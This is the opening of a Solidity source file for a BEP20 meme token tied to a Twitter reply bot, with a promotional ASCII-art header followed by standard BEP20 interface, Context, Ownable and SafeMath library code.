/**
$SHINGHA is the twitter bot @ReplyGPT account that generates humorous & sometimes nonsensical responses to tweets that mention or reply to it. 

WEB: http://shinghea.lol
       
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#&#GBBP#BG&#BB&#####B#&@##BPB&#GBB5PGBB@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@GP##B#BB#&&&&&B&&#&&&B&###&&&@@@@@@&&##&@@@@#B#BPBBG#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#BP5GGG&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&BP5G#&B&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&GPPGBBB#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&5#PG5BGGB@#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BBGPB#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&@@@@PBBPY5B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@&G#@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&BGPG#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@&&&GB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#PG#G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@&&GB#P#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#BP@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@&GBB@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#YP##@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@&&@@BG&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#G#B5P@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@##B5BBBB@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&PP@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@&#@GP#B&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&G5B@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@&G5PP#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&P#@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@GGP#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##@@@@@@@@@@@@@@@@@@@@@@
@@@@@@&#BBG@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&PB@@@@@@@@@@@@@@@@@@@@@
@@@@#PP##&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@###&@@@@@@@@@@@@@@@@@@@
BB&B5#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&G5P5YP#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BP&@@@@@@@@@@@@@@@@@@
@#P&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&G55P5Y5PGG5YJ??YPY?7!!!!!!~7YB&@@@#&#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#B@@@@@@@@@@@@@@@@@@
BP5#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#PYJ??77!~~~~!!!!~^^^:::..::::::::..^!YBY7J?5@B#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#P@@@@@@@@@@@@@@@@@
@&#BB@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&PJ7!~~^::..   .:..                      .:.::::!P&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@5#@@@@@@@@@@@@@@@@
@#P#G#@@@@@@@@@@@@@@@@@@@@@@@@@@@@&B5?~^:..                                          .#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#B@@@@@@@@@@@@@@@@
@#GG#@@@@@@@@@@@@@&BP5PB5?????????7~:.                                               7@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#&@@@@@@@@@@@@@@@
@#P5@@@@@@@@@@@@#5?!!!!!!!!!!!!~^.                                                   Y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@@@@@@@@@@@
@@PG&#B@@@@@@@@P7!!!!!!!!!!!!~:                                                     .Y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@@@@@@@@@@
@@#BGB&@@@@@@@G!!!!!!!!!!!!^.                                                       ~G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&B&@@@@@@@@@@@@@
@@&G5PGG&@@@@@J!!!!!!!!~^:                                                          :Y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#5#@@@@@@@@@@@@@
@@@@@#P5#@@@@B!!!!!!!~.   .:^~!!!!~~^. .:^!77?7!~~^::.                               .?B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@@@@@@@@@@
@@@@@&G#@@@@@?!!!!!!^.:~7?7!~^^^^~!7!!77??J?7!~~^::...                                 .!YB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#PB@@@@@@@@@@@@@
@@@@@&5B@@@@G!!!!!!!~77!~~~^^~!!!!7!!777?J?!~:                                            .^?G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&BPY55G##P#@@@@@@@@@@@@@
@@@@@@GP@@@&?!!!!!!!!^^~7???7!!777777!~^:..                                                   ^P@@@@@@@@@@@@@@@@@@@@@@@@@@@#P7^. .:^^^!YG#@@@@@@@@@@@@
@@@@@@PYG@@P!!!!!!!!!!!!~~!!~~^~:.    !P555555YY?^:..                                           5@@@@@@@@@@@@@@@@@@@@@@&&BJ^ .!5B#&&#GY!^7P#@@@@@@@@@@
@@@@@@@GP@@J!!!!!!!!~~~~^^.   ^~^~  !G&@@@@@@@@@@&&&#BBPY????7!^:.                              :B@@@@@@@@@@@@@@@@@@@&PPJ~ .JBBPPGB#&@@@5.^5&@@@@@@@@@
@@@@@@@BYG#7!!!!!!~^~?!^^:.  ^?^5! !G@@@@@@@@@@@@@@@@@@@@@@@@@@&#BPY?!~:.                        !&@@@@@@@@@@@@@@@@BG???:.!5Y7:    ^7?YG&Y ~B@@@@@@@@@
@@@@@@@@#5G!!!!!^..7G&&BGG!  7!~G. ~B@B5YYYYP&@@@@@@@@@@@@@@@@@@@@@@@@@&B57:                      J@@@@@@@@@@@@@#GY~..~.^5#Y?!:.   .~!?!7P^ Y#@@@@@@@@
@@@@@@@@&5P!!!!:.7G@@@@@@@B^?~.!P.  !G?!!!!!!7?J5PGB#&&&@@@@@@@@@@@@@@@@@@@&P7^.   .:             :B@@@@@@@@@@&P7^     !J!!!^^:.     :JP!JJ ?G@@@@@@@@
@@@@@@@@B55!!!?5B@@@@@@@@@G75^ !J.   :!!!!!!!!!!!!!!777??JJYY5PPGB##&&@@@@@&G57: .!!:              ?&@@@@@@@@#J^.     !! ^^::.         JY75^?B@@@@@@@@
@@@@@@@@@B57!B@@@@@@@@@@#Y!!J?^!~     ^!!!!!!!!!!!!!!!!!!!!!!!!!!!!777?JJ??J557~7J?:               .J@@@@@@@#7:       .  !BY7~:.  .~^  .5?57YB@@@@@@@@
@@@@@@@@@@GJB@@@@@@@@B5?J?7!!J?!      .!!!!!!!!!!!!!!!777!!!!!!!!!!!!!!!?YPGY77?7~..                .YB#@@@@?.         . :PY???!!!!!!^~ ~55!YG@@@@@@@@
@@@@@@@@@&G&@@@@@@#P?!!!!77!!!7!:      ~!!!!!!!!!!7?J???JJJY5YJ?77!!!?J55J7~!7777!...                 ^?G@@G.         :7  !JJ?7!!7!!!!?: YP~5&@@@@@@@@
@@@@@@@@&#@@@@@@#57!!?JJ????7!!!!:     ^7J7!!!!!!7777YB#&###&@&&#BGP5P5JJ?77!7??????77!~:              ^!??^          .Y! ^!!777!^~!!!?^ ?57P@@@@@@@@@
@@@@@@@##@@@@@&57!!!!!777?J5P5J77!^    .!5?!!!!!!!75B&BG5J???????7?????!~:   .:::....                                  !G57^ .  .  :!!!. YY!5@@@@@@@@@
@@@@@@@P&@@@@G?!!!!!!!!!!!!!7??JYY?~.    ?Y!~!!!!?JYJ7!!!!!!!!!!7?JJJJJ7~~^^::..                                        :YB7.       :77:~#~:5@@@@@@@@@
@@@@@@@GB@@&5!!!!!!77?JYY?7!!!!!7?Y7~    .?^  :~7?7!!!!!!!!!!7JJ7~::.:^!7??7!!~:.                                         YP!:   .:^~!:^GJ .Y@@@@@@@@@
@@@@@@@@5##J!!!!7J5G#&&&&#BPJ?77!!Y7!.    :^.   .^7JYJJJ??JJJJ!^.                                                         !P7!!77!~^.:7J~  :P@@@@@@@@@
@@@@@@@@&PY!!!!J5GBGP5YYJJJ?77?7!!J7:        .77^. :~!7777!!!!!~::.          ....                                         ?5~7P^    :~^    ~B@@@@@@@@@
@@@@@@@@@#P!!!7YY?7!!!!!!!!!!!!!7JJ^           :^!!^. .:^~~~!!~::::            .:::.                                     ^BGYJ^           ~P@@@@@@@@@@
@@@@@@@@@@#5?JPPJ7!!!!!77??JJJJY5P?.              .::  .:~7JJYJ:                  .::.                                .^ ^PJ^            !P@@@@@@@@@@@
@@@@@@@@@@@&PJ?5G5YYY5PPP55YYYJ!:J~                      :..:^77^.                   ..                                ^..             .JP&@@@@@@@@@@@
@@@@@@@@@@@&GJ?J??JJJ?!~~~7?7~.:!J.                   ...^!!~:..::.             .                                      :!:            :PB@@@@@@@@@@@@@
@@@@@@@@@@@#5YJ77?7!.  .:^^.  :~J~                 :^.:^^~!?Y5J7!~~:            .^.                                    .^ :         .7B#@@@@@@@@@@@@@@
@@@@@@@@@@@#5?!!!!!.          .77                 :77!7!:  .:~7Y5J?!~:  ...      .^~:                                    .J^  ..:~7Y#@#&@@@@@@@@@@@@@@
@@@@@@@@@@@BY!!!!!.         .:7J.                     .!J~     .^?55Y?~.  .::..    :!!:                                  ^B#BGPP55B@@&G@@@@@@@@@@@@@@@
@@@@@@@@@@@BJ!!!!:     .~~~~!!J^                       .!Y^       :7YPGY~.   ..:.    ~Y!                                 ~&@GJ7!!!P@@GB@@@@@@@@@@@@@@@
@@@@@@@@@@@BJ!!!!     :!!!!!!7?                      .:~?J~         ^!JPB5~     .::.  ^PY.                               ^&5!!!!!!G@#G@@@@@@@@@@@@@@@@
@@@@@@@@@@@BJ!!!!.    :!!!!?7!7:     .::^^^~!77?JJYYYYJJ7^           .^!?G#Y^  ^. .:.  ^BJ                               .57!!!!!7B@P#@@@@@@@@@@@@@@@@
@@@@@@@@@@&GY!!!!~   .7?!!!J?!!!^. :~!!!7?P#&@@@@&#GY7~:               :!!JBB7^~!.      ?&:                               ~!!!!!!7&&P&@@@@@@@@@@@@@@@@
@@@@@@@@@@@BG!!!!!!^^JJ!!!!7JJJ55YY?777!7YG##BPY?!^..                  .!!!7PG?!?7      :#7                    .          ~!!!!!!J&G&@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@#Y!!!!!!7?!??!!!!?Y5YY5JJJYYYYJ?7!~:.                    .:!!!!!!Y5!!Y!      BJ  .                .:        ^!77!!!!!YBG@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@&B?!!!!!!!YP!!!!!!!!!!!!!!!!!!!~~:   .::^~!!!7777777777777!!!!77!!J7!?5.    .B5  !.             .^^       .~7!!J7!!!!PG#@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@&G?!!!!!?#J!!!!!!!!!!!!!!77~:..:^~!77777777777???JJJJYY5YYJ777Y5?!!!75~    .#J .?.            ^~:       .!!!!!J?!!!!GG&@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@&P?!!!!J&?!!!!!!!!!!7?JJJJJ?JJJ?7!!!!77?JJJYYJJYJ7!JJJ?J5JJ5YY5BP7!!5?    ^#^ ~J.          :~^.       :!!!!!!?Y!!!!G5@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@G?!!!7#P!!!!!!!!7JJ?7!!!!77777??JYYJ5?!?Y!. ^J:  !~.:!J!!JJ5BYBP!!5J    ?P. ??         .~!:        ^!!!!!!!757!!!5P@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@BJ!!!Y&J!!!!!!7YYPGGJJJJJJJ?7?J~::??  .~    ~:  ~?~^^?YPB#@P!7P7!55    5? .Y!        :!^        :~!!!!!!!!7P7!!!YG@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@BJ77!5#J!!!!!?5&@@@G77J^?~  ^?   :^   ^^:^J#&GB&@@@@@@@@&5!..77!P5   :G^ ~Y::^     :!:    ..:^~!!!!!!!!!!!G?!!!YG@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@GJ?J7JB57!!!J&@@@@@J.~ .    .   .^!JG@@&@@@@@@&&&&&&&&G?!:  .!!BY   JP  ?J^!:    .~.   :~!!!!!!!!!!!!!!!!5?!!!YG@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@GY?P57JPJ!!?Y5PG&@&~   ^^:~7J5P#&@@&&&&&&#PYJ?????JYJ!!^    ^7#? .7#7 :57!!     ..  :~!!!!!!!!!!!!!!!!!!Y7!!!JP&@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@BY7PP7~JY?!!!!!J&@&GGG&@&@@@@@#5J??????7!~^::^:^!?7!7~     .Y#^ :BG: 75!!:       :~!!!!!!!!!!!!!!!!!!!7J!!!!?G#@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@#P7?5J!?YY7!!!7JB@@@@@@@@@@B5?~~^:.:~  ^^.^7?!!7!!~^      .B5  !#!  P?!~      :~!!!!!!!!!!!!!!!!!!!!!J?!!!^!G#@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@G?7JJ7!?YJ7!7?7JG#@@@@@5!~.^:.~~.^J7~??777777!:.        ?B:  Y5  ~P!!.    .~!!!!!!!!!!!!!!!!!!!!!!J?!!!. ^YB#@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@BY7?J7!!J5?!7J7!7?JJJJ??????77777!!!!777!~:.          7B~  ~5^ .P?!^   .^!!!!!!!!!!!!!!!!!!!!!!!7?!!!.  :7#P@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@&P?7J?!!7YJ!7J?7!!!!!!!!!!!!!!777???!^.             ~P~  .5?  ?Y!~  .^!!!!!!!!!!!!!!!!!!!!!!!!!!!!!~    ~PG#@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@#57??^.:JJ!!?J???77777777??77!~^:......          ^J:   ?P. ^57~  :!!!!!!!!!!!!!!!!!!!!!7?7!!!!!!!^    :J#G@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BY7?^  7J!!!777??7!~~~~~~~!7?JJJJJ7~:.        ~?:   ^B! .J?~.:~!!!!!!!!!!!!!!!!!!!!7JJ7!!!^~!!!^     ~BG@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BYY~  ?J!!!!!!???YPPGGBBBGP5J?!^.         :7!    .PP  ??~:~!!!!!!!!!!!!!!!!!!!!7JY?!!!~.  ^!!^     .YBB@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BP! .JJ!!!!!~^:::^^~~~~^::.           .!?^    .YB^ 7?!~!!!!!!!!!!!!!!!!!!!!!?5J7!!!^    .!!~      ~#B@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&G7.~5?!!!.                         .~~    .^J#?^7?!!!!!!!!!!!!!!!!!!!!!!?YY7!!!!:      ~7!.     .5B#@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@G7^J5!!:                          :    :~!JBJ!!7!!!!!!!!!!!!!!!!!!!!!7Y5?!!!!!.       .!!:      ~BB@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P77Y7!.                            .^!!!JP?!!!!!!!!!!!!!!!!!!!!!!!7J5J7!!!!~.         ^7^       YB@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#57?:~^                    :^:..:^!!!!7JY7!!!!!!!!!!!!!!!!!!!!!!!J5J7!!!!!^            !!       ^GP&@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B5!^ ^.       ....     :^!!!!!!!!!!7?JJ7!!!!!!!!!!!!!!!!!!!!!!?YY7!!!!~^.             :!.       JGYB@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&P?!~.      .::..  .:^!!!!!!!!!!!!!?JJ?!!!!!!!!!!!!!!!!!!!!7?YJ7!!!~:.                 ^^       :P?~YB&@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BY7!!~^:.......:^~!!!!!!!!!!!!!!7JYJJ?!!!!!!!!!!!!!!!!!!7JYJ7!~^:                     .^        75: :75#@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BY7!!!!!!!!!!!!!!!!!!!!!!!!!7JYYJY5?!!!!!!!!!!!!!!!!!?YY?!~:.                         .        .YJ   .!P#&@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&B5J?7!!!!!!!!!!!!!!!77?JYYYYJYYJ7!!!!!!!!!!!!!!!7?J?!^:.                                      ~57    .!YG#@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B5YG5YJ??????JJJJJJJJ?7??J?7!!!!!!!!!!!!!!!!!!7!^.                                          .75^      ^?P
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#P?!JGJJJJJ?77777!!!!!!!!!!!!!!!!!!!!!!!!!!!!!^:                                              ^?J~.      :
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&G?!!!?5?!7?JJ?!!!!!!!!!!!!!!!!!!!!!!!!!!!!!~:.                                                .!?P?      .
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#G?!!!!!7YY!!!!7!!!!!!!!!!!!!!!!!!!!!!!!!!!~:                                                    ~!7Y:     .
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#P7!!!!!!!!JP7!!!!!!!!!!!!!!!!!!!!!!!!!!!!!:                                                      :!!Y:     .
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#B5!!!!!!!!!!!?GJ!!!!!!!!!!!!!!!!!!!!!!!!!!!!:.                                                      !7J.     .
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#GJ!!!!!!!!!!!!!7557!!!!!!!!!!!!!!!!!!!!!!!!~~!~^                                                     ^Y!      .
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BP7!!!!!!!!!!!!!!!!JY?!!!!!!!!!!!!!!!!!!!!^.                                                           ^Y.      .
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#GY!!!!!!!!!!!!!!!!!!!7??7!!!!!!!!!!!!!!!~:                                                              ^!       .
@@@@@@@@@@@@@@@@@@@@@@@@@@@#BGBBP5YPY!!!!!!!!!!!!!!~~~~^^^!7?7!!!!!!!!!!~^:.                                                                ^.       .

*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface BEP20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Multiplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
